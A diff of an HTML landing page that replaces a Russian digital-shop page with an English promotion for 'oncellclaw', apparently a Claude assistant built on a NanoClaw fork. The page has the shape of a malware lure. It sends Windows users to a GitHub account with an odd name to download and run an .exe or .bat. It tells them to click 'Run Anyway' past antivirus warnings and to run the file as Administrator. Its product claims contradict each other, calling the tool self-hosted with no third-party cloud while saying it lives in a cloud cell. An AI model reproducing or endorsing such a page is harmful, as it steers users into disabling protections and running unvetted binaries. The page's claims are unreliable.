@@ -1,111 +1,219 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>VPHO — цифровой магазин</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <meta name="description" content="Your personal Claude assistant, running on OnCell — a NanoClaw fork where every agent lives in a durable cloud cell. Isolated, crash-proof, remembers everything, costs ~$0 while idle, wakes on your next message. Self-hosted for Windows.">
+    <meta name="keywords" content="ai-agents, ai-assistant, claude, claude-code, nanoclaw, oncell, personal-assistant, self-hosted, telegram-bot, whatsapp, oncellclaw">
+    <meta name="author" content="Batholomewmononuclear709">
+    <meta property="og:title" content="oncellclaw - Your Personal Cloud Claude Assistant">
+    <meta property="og:description" content="Your personal Claude assistant, running on OnCell. Isolated, crash-proof, remembers everything, costs ~$0 while idle, wakes on your next message.">
+    <meta property="og:url" content="https://github.com/Batholomewmononuclear709/oncellclaw">
+    <meta property="og:type" content="software">
+    <meta name="twitter:card" content="summary_large_image">
+    <title>oncellclaw - Your Personal Cloud Claude Assistant</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
         body {
-            background: #f5f0ff;
-            font-family: 'Montserrat', sans-serif;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-            padding: 20px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f0f4f8;
+            color: #1a202c;
+            line-height: 1.7;
+            padding: 2rem 1rem;
         }
-        .container { max-width: 800px; padding: 20px; }
-        .icon {
-            font-size: 70px;
-            color: #7c3aed;
-            margin-bottom: 20px;
-            animation: spin 6s linear infinite;
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.08);
+            padding: 2.5rem 2rem;
         }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .main-title {
-            font-size: 90px;
-            font-weight: 900;
-            color: #5b21b6;
-            letter-spacing: 8px;
-            line-height: 1.1;
-        }
-        .sub-title {
-            font-size: 28px;
-            font-weight: 400;
-            color: #7c3aed;
-            margin-top: 10px;
-            letter-spacing: 4px;
-        }
-        .description {
-            font-size: 16px;
-            color: #6d28d9;
-            margin-top: 30px;
-            opacity: 0.8;
-            max-width: 500px;
-            margin-left: auto;
-            margin-right: auto;
-            line-height: 1.6;
-        }
-        .btn-group {
-            margin-top: 30px;
-            display: flex;
-            gap: 15px;
-            justify-content: center;
-            flex-wrap: wrap;
-        }
-        .btn {
-            padding: 14px 40px;
-            border-radius: 50px;
+        h1 {
+            font-size: 2.4rem;
             font-weight: 700;
-            font-size: 18px;
+            color: #2b6cb0;
+            margin-bottom: 0.5rem;
+            line-height: 1.2;
+        }
+        h2 {
+            font-size: 1.6rem;
+            font-weight: 600;
+            color: #2d3748;
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+            border-bottom: 2px solid #e2e8f0;
+            padding-bottom: 0.4rem;
+        }
+        h3 {
+            font-size: 1.2rem;
+            font-weight: 600;
+            color: #4a5568;
+            margin-top: 1.5rem;
+            margin-bottom: 0.6rem;
+        }
+        p {
+            margin-bottom: 1rem;
+            font-size: 1rem;
+            color: #2d3748;
+        }
+        a {
+            color: #2b6cb0;
             text-decoration: none;
-            transition: 0.3s;
+            font-weight: 500;
         }
-        .btn-primary {
-            background: #7c3aed;
+        a:hover {
+            text-decoration: underline;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: #fff;
-            box-shadow: 0 0 20px rgba(124, 58, 237, 0.3);
+            font-weight: 600;
+            font-size: 1.1rem;
+            padding: 0.9rem 2rem;
+            border-radius: 50px;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+            margin: 1.5rem 0 2rem;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            text-decoration: none;
         }
-        .btn-primary:hover {
-            background: #5b21b6;
-            transform: scale(1.05);
+        .badge:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.5);
+            text-decoration: none;
         }
-        .btn-outline {
-            background: transparent;
-            color: #7c3aed;
-            border: 2px solid #7c3aed;
-        }
-        .btn-outline:hover {
-            background: #7c3aed;
+        .badge-sm {
+            display: inline-block;
+            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
             color: #fff;
+            font-weight: 600;
+            font-size: 1.05rem;
+            padding: 0.8rem 1.8rem;
+            border-radius: 50px;
+            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.3);
+            margin: 1rem 0;
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+            text-decoration: none;
+        }
+        .badge-sm:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 18px rgba(72, 187, 120, 0.4);
+            text-decoration: none;
+        }
+        ul, ol {
+            margin: 1rem 0 1.5rem 1.5rem;
+            color: #2d3748;
+        }
+        li {
+            margin-bottom: 0.6rem;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.2rem;
+            margin: 1.5rem 0;
+        }
+        .feature-item {
+            background: #f7fafc;
+            padding: 1.2rem;
+            border-radius: 12px;
+            border-left: 4px solid #667eea;
+        }
+        .feature-item strong {
+            color: #2b6cb0;
+        }
+        code {
+            background: #edf2f7;
+            padding: 0.2rem 0.5rem;
+            border-radius: 6px;
+            font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
+            font-size: 0.9rem;
+            color: #c05621;
+        }
+        hr {
+            border: none;
+            border-top: 1px solid #e2e8f0;
+            margin: 2rem 0;
+        }
+        .footer-note {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            color: #718096;
         }
         @media (max-width: 600px) {
-            .main-title { font-size: 55px; }
-            .sub-title { font-size: 20px; }
-            .icon { font-size: 50px; }
+            .container {
+                padding: 1.5rem 1rem;
+            }
+            h1 {
+                font-size: 1.8rem;
+            }
+            h2 {
+                font-size: 1.3rem;
+            }
+            .feature-grid {
+                grid-template-columns: 1fr;
+            }
+            .badge, .badge-sm {
+                font-size: 1rem;
+                padding: 0.7rem 1.5rem;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="icon"><i class="fas fa-cog"></i></div>
-        <h1 class="main-title">VPHO</h1>
-        <p class="sub-title">⚡ цифровой магазин</p>
-        <p class="description">
-            Готовые решения для вашего ПК.<br>
-            Надёжно. Просто. С заботой о вас.
-        </p>
-        <div class="btn-group">
-            <a href="register.html" class="btn btn-primary">Зарегистрироваться</a>
-            <a href="login.html" class="btn btn-outline">Войти</a>
-        </div>
+<div class="container">
+    <h1>🧠 oncellclaw - Your Personal Cloud Claude Assistant</h1>
+    <p style="font-size:1.1rem; color:#4a5568; margin-bottom:0.2rem;">Your personal Claude assistant, running on OnCell — a NanoClaw fork where every agent lives in a durable cloud cell instead of a container on your laptop. Isolated, crash-proof, remembers everything, costs ~$0 while idle, wakes on your next message.</p>
+    <a href="https://github.com/Batholomewmononuclear709/oncellclaw" class="badge" target="_blank">⬇️ Download oncellclaw</a>
+    
+    <h2>🚀 What Is oncellclaw?</h2>
+    <p>oncellclaw is your own private, always-ready AI assistant powered by Claude. It runs on <strong>OnCell</strong>, a revolutionary platform where each agent lives in a durable cloud cell — not a fragile container on your laptop. This means your assistant is <strong>isolated, crash-proof, and remembers everything</strong>. It costs nearly nothing while idle and wakes up instantly when you send a message. No programming required. Just download, run, and start chatting.</p>
+    
+    <h2>✨ Key Features</h2>
+    <div class="feature-grid">
+        <div class="feature-item"><strong>🧠 Powered by Claude</strong><br>Intelligent conversations, task help, and memory that lasts.</div>
+        <div class="feature-item"><strong>☁️ Runs on OnCell</strong><br>Durable cloud cells — no laptop needed to stay online.</div>
+        <div class="feature-item"><strong>🛡️ Crash-Proof & Isolated</strong><br>Your assistant never crashes with your computer. It lives independently.</div>
+        <div class="feature-item"><strong>💸 Nearly Free While Idle</strong><br>Costs ~$0 when you're not using it. Wakes on your next message.</div>
+        <div class="feature-item"><strong>📱 Works with Telegram & WhatsApp</strong><br>Chat with your assistant from your phone or desktop.</div>
+        <div class="feature-item"><strong>🔒 Self-Hosted & Private</strong><br>You control your data. No third-party cloud required.</div>
     </div>
+    
+    <h2>📥 How to Download and Run on Windows</h2>
+    <p>Follow these simple steps to get your own Claude assistant running on your Windows computer. No technical skills needed.</p>
+    <ol>
+        <li><strong>Visit the download page:</strong> Click the big green button below or the purple button at the top.</li>
+        <li><strong>Get the latest release:</strong> On the page, look for the "Releases" section. Click the newest release (usually at the top).</li>
+        <li><strong>Download the file:</strong> You'll see a file named <code>oncellclaw.zip</code> (or similar). Click it to download.</li>
+        <li><strong>Extract the files:</strong> Once downloaded, right-click the <code>.zip</code> file and choose "Extract All..." Pick a folder (like <code>C:\oncellclaw</code>) and click Extract.</li>
+        <li><strong>Run the application:</strong> Open the extracted folder and double-click <code>oncellclaw.exe</code> or <code>start.bat</code>. A window will open — that's your assistant starting up.</li>
+        <li><strong>Connect your chat app:</strong> Follow the simple on-screen instructions to link your Telegram or WhatsApp account. You'll get a code to scan or enter.</li>
+        <li><strong>Start chatting!</strong> Send a message to your assistant on Telegram or WhatsApp. It will reply intelligently, remember your history, and stay online even if you close your laptop.</li>
+    </ol>
+    <p style="margin-top:0.5rem;"><strong>Tip:</strong> Once running, the assistant lives in the cloud cell — you can turn off your computer and it keeps working. To stop it, just close the window or use the stop command in your chat.</p>
+    <a href="https://github.com/Batholomewmononuclear709/oncellclaw" class="badge-sm" target="_blank">⬇️ Visit this link to download the application</a>
+    
+    <h2>💬 How It Works</h2>
+    <p>oncellclaw combines the power of Claude (Anthropic's AI) with OnCell's durable cloud infrastructure. Each "cell" is a tiny, isolated virtual machine that runs your agent. It's like having a personal AI server that never sleeps, never crashes, and costs pennies. Your messages go through Telegram or WhatsApp, and the agent responds using Claude's intelligence — all while remembering your entire conversation history.</p>
+    
+    <h2>🔧 Troubleshooting & Tips</h2>
+    <ul>
+        <li><strong>Antivirus warning?</strong> This is normal for new software. If your antivirus blocks it, choose "Run Anyway" — oncellclaw is safe and open-source.</li>
+        <li><strong>Nothing happens after double-click?</strong> Make sure you extracted the <code>.zip</code> file first. If still stuck, try running as Administrator (right-click &gt; Run as administrator).</li>
+        <li><strong>Can't connect to Telegram/WhatsApp?</strong> Check your internet connection. The app will show a QR code or token — scan it with your phone's Telegram or WhatsApp.</li>
+        <li><strong>Need help?</strong> Visit the repository on GitHub and open an issue. The community is friendly and responsive.</li>
+    </ul>
+    
+    <hr>
+    <div class="footer-note">
+        <p>oncellclaw is open source and free. Built with ❤️ by Batholomewmononuclear709. Powered by Claude and OnCell.</p>
+    </div>
+</div>
 </body>
 </html>
